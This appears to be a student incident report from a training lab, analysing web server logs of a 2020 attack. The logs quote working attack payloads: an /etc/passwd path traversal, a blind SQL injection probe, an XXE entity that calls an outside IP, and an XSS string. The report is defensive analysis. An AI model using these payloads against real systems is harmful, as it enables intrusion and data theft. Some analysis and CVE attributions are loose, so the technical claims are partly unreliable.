
# Incident Report '8'

  

Matt, Mohamed, Peter, Rajan, Omozaye | Lighthouse Labs Desk 10

  

Date and time of attack:
Attack start: 28/09/2020 07:25:42:00AM
Attack end: 30/09/2020 11:52:38:00AM
  


## Vector Diagnosis

1. Local File Inclusion, SQL Injection, XXE Injection, XSS, FTP Brutefoce, HTTP Bruteforce.

2. Attempted SQL Injection in which they attempted to gain information about the 'information_schema' within our SQL DB by outputting table/column output. Attempted to bruteforce login via HTML/FTP. Attempted to determine if server was vulnerable to XSS via XXE injection. Attempted to traverse via LFI. 
  

## Attack Analysis

1. In SQL, the 'information_schema' was the target. Query was issued 200 status, no SQL logs, most likely successful. HTTP Bruteforce attempts were unsuccessful and were blocked as unauthorized 403 status. XXE injection was likely successful, shown 200 status. 

  
**Example of attacks below**

Performing local file inclusion to access username list on /etc/passwd file
```
113.53.75.43--[30/Sep/2020:07:49:32-0400]"GET/login.php?file=.\/\.\.\/\.\/etc/passwdHTTP/1.1"2003343"http://www.cybintnews.com/index.html?file=.\/\.\.\/\.\/etc/passwd"
```

SQL Injection targeting columns from 'Information_schema'
```
 ??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'HTTP/1.1"2003343"http://www.cybintnews.com/index.html??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'"
```

XXE is attempting to load external DTF  
```
158.52.23.93--[30/Sep/2020:07:49:26-0400]"GET/login.php?upload=<foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://57.21.52.73:22/">%dtd;]><xxx/>]]></foo>HTTP/1.1"2003343"http://www.cybintnews.com/index.html?upload=<foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://57.21.52.73:22/">%dtd;]><xxx/>]]></foo>"
```

Using XXE to determine if XSS is possible 
```
138.27.84.74--[30/Sep/2020:07:49:26-0400]"GET/index.html?upload=<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>HTTP/1.1"2003343"http://www.cybintnews.com/index.html?upload=<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
```


**List of targeted FTP Users**
| Usernames  | Attempts |
| ------------- |:-------------:| 
| admin  | **803** |
| root | **399** |

**List of most targeted FTP Passwords**
| Passwords  | Attempts |
| ------------- |:-------------:| 
| admin1234  | **95** |
| Adminpass123 | **72** |
| dsvasdvasdv | **72** |
| p@ssword12!  | **72** |
| wqevqv | **72** |
| we | **72**
| asdfvasa | **70** |
| dsa | **70** |
| sdvas | **70** |
| sdvav | **70** |

**Sample of attacks**  

IP | Country | Events | Example of attack
--- | --- | --- | --- |
164.45.76.23 | United States | **408** | `164.45.76.23 - - [28/Sep/2020:07:25:49 +0000] 164.45.76.23:21 - 164.45.76.23:21 - LOGIN FAILED: admin:we (Incorrect: ) FTP Auth Attempts`
186.26.85.78 | Brazil | **399** | `FTP Auth Attempts`
74.213.66.24 | Puerto Rico | **399** | `FTP Auth Attempts`
86.44.133.63 | Ireland | **87** | `/login.php??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > `
138.27.84.74 | United States | **39** | `/login.php?loginusername=administrator&loginpassword=66776677`
113.53.75.43 | Thailand | **1** | `/login.php?file=.\/\.\.\/\.\/etc/passwd`


## Signature / CVE Details

**CVE-2021-23899**

```
CVE-ID
CVE-2021-23899
	
Description
OWASP json-sanitizer before 1.2.2 may emit closing SCRIPT tags and CDATA section delimiters for crafted input. This allows an attacker to inject arbitrary HTML or XML into embedding documents.
References


    MISC:https://github.com/OWASP/json-sanitizer/commit/a37f594f7378a1c76b3283e0dab9e1ab1dc0247e
    MISC:https://github.com/OWASP/json-sanitizer/compare/v1.2.1...v1.2.2
    MISC:https://groups.google.com/g/json-sanitizer-support/c/dAW1AeNMoA0 

Assigning CNA
MITRE Corporation
Date Record Created
20210112
Phase (Legacy)
Assigned (20210112)
```
**CVE-2021-29425**

```
CVE-2021-29425
	
Description
In Apache Commons IO before 2.7, When invoking the method FileNameUtils.normalize with an improper input string, like "//../foo", or "\\..\foo", the result would be the same value, thus possibly providing access to files in the parent directory, but not further above (thus "limited" path traversal), if the calling code would use the result to construct a path value.
References

    MISC:https://issues.apache.org/jira/browse/IO-556
    URL:https://issues.apache.org/jira/browse/IO-556
    MISC:https://lists.apache.org/thread.html/rc359823b5500e9a9a2572678ddb8e01d3505a7ffcadfa8d13b8780ab%40%3Cuser.commons.apache.org%3E
    URL:https://lists.apache.org/thread.html/rc359823b5500e9a9a2572678ddb8e01d3505a7ffcadfa8d13b8780ab%40%3Cuser.commons.apache.org%3E
    MISC:https://www.oracle.com/security-alerts/cpujan2022.html
    URL:https://www.oracle.com/security-alerts/cpujan2022.html
    MISC:https://www.oracle.com/security-alerts/cpuoct2021.html
    URL:https://www.oracle.com/security-alerts/cpuoct2021.html
    MLIST:[commons-dev] 20210414 Re: [all] OSS Fuzz
    URL:https://lists.apache.org/thread.html/rfd01af05babc95b8949e6d8ea78d9834699e1b06981040dde419a330@%3Cdev.commons.apache.org%3E
    MLIST:[commons-dev] 20210415 Re: [all] OSS Fuzz
    URL:https://lists.apache.org/thread.html/r8efcbabde973ea72f5e0933adc48ef1425db5cde850bf641b3993f31@%3Cdev.commons.apache.org%3E
    MLIST:[commons-user] 20210709 Re: commons-fileupload dependency and CVE
    URL:https://lists.apache.org/thread.html/r808be7d93b17a7055c1981a8453ae5f0d0fce5855407793c5d0ffffa@%3Cuser.commons.apache.org%3E
    MLIST:[commons-user] 20210709 commons-fileupload dependency and CVE
    URL:https://lists.apache.org/thread.html/rad4ae544747df32ccd58fff5a86cd556640396aeb161aa71dd3d192a@%3Cuser.commons.apache.org%3E
    MLIST:[creadur-dev] 20210427 [jira] [Closed] (RAT-281) Update commons-io to fix CVE-2021-29425 Moderate severity
    URL:https://lists.apache.org/thread.html/r47ab6f68cbba8e730f42c4ea752f3a44eb95fb09064070f2476bb401@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210427 [jira] [Commented] (RAT-281) Update commons-io to fix CVE-2021-29425 Moderate severity
    URL:https://lists.apache.org/thread.html/r8569a41d565ca880a4dee0e645dad1cd17ab4a92e68055ad9ebb7375@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210427 [jira] [Created] (RAT-281) Update commons-io to fix CVE-2021-29425 Moderate severity
    URL:https://lists.apache.org/thread.html/raa053846cae9d497606027816ae87b4e002b2e0eb66cb0dee710e1f5@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210427 [jira] [Updated] (RAT-281) Update commons-io to fix CVE-2021-29425 Moderate severity
    URL:https://lists.apache.org/thread.html/rfa2f08b7c0caf80ca9f4a18bd875918fdd4e894e2ea47942a4589b9c@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210518 [jira] [Assigned] (WHISKER-19) Update commons-io to fix CVE-2021-29425
    URL:https://lists.apache.org/thread.html/rbebd3e19651baa7a4a5503a9901c95989df9d40602c8e35cb05d3eb5@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210518 [jira] [Commented] (WHISKER-19) Update commons-io to fix CVE-2021-29425
    URL:https://lists.apache.org/thread.html/r523a6ffad58f71c4f3761e3cee72df878e48cdc89ebdce933be1475c@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210518 [jira] [Created] (WHISKER-19) Update commons-io to fix CVE-2021-29425
    URL:https://lists.apache.org/thread.html/ra8ef65aedc086d2d3d21492b4c08ae0eb8a3a42cc52e29ba1bc009d8@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210518 [jira] [Updated] (WHISKER-19) Update commons-io to fix CVE-2021-29425
    URL:https://lists.apache.org/thread.html/r2bc986a070457daca457a54fe71ee09d2584c24dc262336ca32b6a19@%3Cdev.creadur.apache.org%3E
    MLIST:[creadur-dev] 20210621 [jira] [Commented] (RAT-281) Update commons-io to fix CVE-2021-29425 Moderate severity
    URL:https://lists.apache.org/thread.html/r345330b7858304938b7b8029d02537a116d75265a598c98fa333504a@%3Cdev.creadur.apache.org%3E
    MLIST:[debian-lts-announce] 20210812 [SECURITY] [DLA 2741-1] commons-io security update
    URL:https://lists.debian.org/debian-lts-announce/2021/08/msg00016.html
    MLIST:[kafka-users] 20210617 vulnerabilities
    URL:https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe@%3Cusers.kafka.apache.org%3E
    MLIST:[myfaces-dev] 20210504 [GitHub] [myfaces-tobago] lofwyr14 opened a new pull request #808: build: CVE fix
    URL:https://lists.apache.org/thread.html/r27b1eedda37468256c4bb768fde1e8b79b37ec975cbbfd0d65a7ac34@%3Cdev.myfaces.apache.org%3E
    MLIST:[portals-pluto-dev] 20210714 [jira] [Closed] (PLUTO-789) Upgrade to commons-io-2.7 due to CVE-2021-29425
    URL:https://lists.apache.org/thread.html/rc65f9bc679feffe4589ea0981ee98bc0af9139470f077a91580eeee0@%3Cpluto-dev.portals.apache.org%3E
    MLIST:[portals-pluto-dev] 20210714 [jira] [Created] (PLUTO-789) Upgrade to commons-io-2.7 due to CVE-2021-29425
    URL:https://lists.apache.org/thread.html/rc2dd3204260e9227a67253ef68b6f1599446005bfa0e1ddce4573a80@%3Cpluto-dev.portals.apache.org%3E
    MLIST:[portals-pluto-scm] 20210714 [portals-pluto] branch master updated: PLUTO-789 Upgrade to commons-io-2.7 due to CVE-2021-29425
    URL:https://lists.apache.org/thread.html/r2df50af2641d38f432ef025cd2ba5858215cc0cf3fc10396a674ad2e@%3Cpluto-scm.portals.apache.org%3E
    MLIST:[pulsar-commits] 20210420 [GitHub] [pulsar] lhotari opened a new pull request #10287: [Security] Upgrade commons-io to address CVE-2021-29425
    URL:https://lists.apache.org/thread.html/r873d5ddafc0a68fd999725e559776dc4971d1ab39c0f5cc81bd9bc04@%3Ccommits.pulsar.apache.org%3E
    MLIST:[pulsar-commits] 20210420 [GitHub] [pulsar] merlimat merged pull request #10287: [Security] Upgrade commons-io to address CVE-2021-29425
    URL:https://lists.apache.org/thread.html/r0d73e2071d1f1afe1a15da14c5b6feb2cf17e3871168d5a3c8451436@%3Ccommits.pulsar.apache.org%3E
    MLIST:[pulsar-commits] 20210429 [pulsar] branch branch-2.7 updated: [Security] Upgrade commons-io to address CVE-2021-29425 (#10287)
    URL:https://lists.apache.org/thread.html/r1c2f4683c35696cf6f863e3c107e37ec41305b1930dd40c17260de71@%3Ccommits.pulsar.apache.org%3E
    MLIST:[zookeeper-commits] 20210901 [zookeeper] branch master updated: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r4050f9f6b42ebfa47a98cbdee4aabed4bb5fb8093db7dbb88faceba2@%3Ccommits.zookeeper.apache.org%3E
    MLIST:[zookeeper-dev] 20210805 [jira] [Created] (ZOOKEEPER-4343) OWASP Dependency-Check fails with CVE-2021-29425, commons-io-2.6
    URL:https://lists.apache.org/thread.html/rfcd2c649c205f12b72dde044f905903460669a220a2eb7e12652d19d@%3Cdev.zookeeper.apache.org%3E
    MLIST:[zookeeper-issues] 20210805 [jira] [Created] (ZOOKEEPER-4343) OWASP Dependency-Check fails with CVE-2021-29425, commons-io-2.6
    URL:https://lists.apache.org/thread.html/r477c285126ada5c3b47946bb702cb222ac4e7fd3100c8549bdd6d3b2@%3Cissues.zookeeper.apache.org%3E
    MLIST:[zookeeper-issues] 20210805 [jira] [Updated] (ZOOKEEPER-4343) OWASP Dependency-Check fails with CVE-2021-29425, commons-io-2.6
    URL:https://lists.apache.org/thread.html/r8bfc7235e6b39d90e6f446325a5a44c3e9e50da18860fdabcee23e29@%3Cissues.zookeeper.apache.org%3E
    MLIST:[zookeeper-issues] 20210901 [jira] [Resolved] (ZOOKEEPER-4343) OWASP Dependency-Check fails with CVE-2021-29425, commons-io-2.6
    URL:https://lists.apache.org/thread.html/r5149f78be265be69d34eacb4e4b0fc7c9c697bcdfa91a1c1658d717b@%3Cissues.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210805 [GitHub] [zookeeper] ztzg commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.7 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r2345b49dbffa8a5c3c589c082fe39228a2c1d14f11b96c523da701db@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210805 [GitHub] [zookeeper] ztzg opened a new pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.7 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r92ea904f4bae190b03bd42a4355ce3c2fbe8f36ab673e03f6ca3f9fa@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210806 [GitHub] [zookeeper] nkalmar commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.7 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/rc10fa20ef4d13cbf6ebe0b06b5edb95466a1424a9b7673074ed03260@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210813 [GitHub] [zookeeper] eolivelli commented on a change in pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/rd09d4ab3e32e4b3a480e2ff6ff118712981ca82e817f28f2a85652a6@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210813 [GitHub] [zookeeper] eolivelli commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/re41e9967bee064e7369411c28f0f5b2ad28b8334907c9c6208017279@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210813 [GitHub] [zookeeper] ztzg commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/rca71a10ca533eb9bfac2d590533f02e6fb9064d3b6aa3ec90fdc4f51@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210816 [GitHub] [zookeeper] nkalmar commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/red3aea910403d8620c73e1c7b9c9b145798d0469eb3298a7be7891af@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210816 [GitHub] [zookeeper] nkalmar edited a comment on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r01b4a1fcdf3311c936ce33d75a9398b6c255f00c1a2f312ac21effe1@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210825 [GitHub] [zookeeper] eolivelli commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/rc5f3df5316c5237b78a3dff5ab95b311ad08e61d418cd992ca7e34ae@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210825 [GitHub] [zookeeper] ztzg commented on a change in pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r86528f4b7d222aed7891e7ac03d69a0db2a2dfa17b86ac3470d7f374@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210825 [GitHub] [zookeeper] ztzg commented on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r20416f39ca7f7344e7d76fe4d7063bb1d91ad106926626e7e83fb346@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210825 [GitHub] [zookeeper] ztzg edited a comment on pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r0bfa8f7921abdfae788b1f076a12f73a92c93cc0a6e1083bce0027c5@%3Cnotifications.zookeeper.apache.org%3E
    MLIST:[zookeeper-notifications] 20210901 [GitHub] [zookeeper] ztzg closed pull request #1735: ZOOKEEPER-4343: Bump commons-io to version 2.11 (avoids CVE-2021-29425)
    URL:https://lists.apache.org/thread.html/r462db908acc1e37c455e11b1a25992b81efd18e641e7e0ceb1b6e046@%3Cnotifications.zookeeper.apache.org%3E 

Assigning CNA
Apache Software Foundation
```

  

## Mitigation Steps

Disable DTD - External entities within HTML5. Whitelist only FTP port 21, and use SFTP over SSH. Santize Inputs.
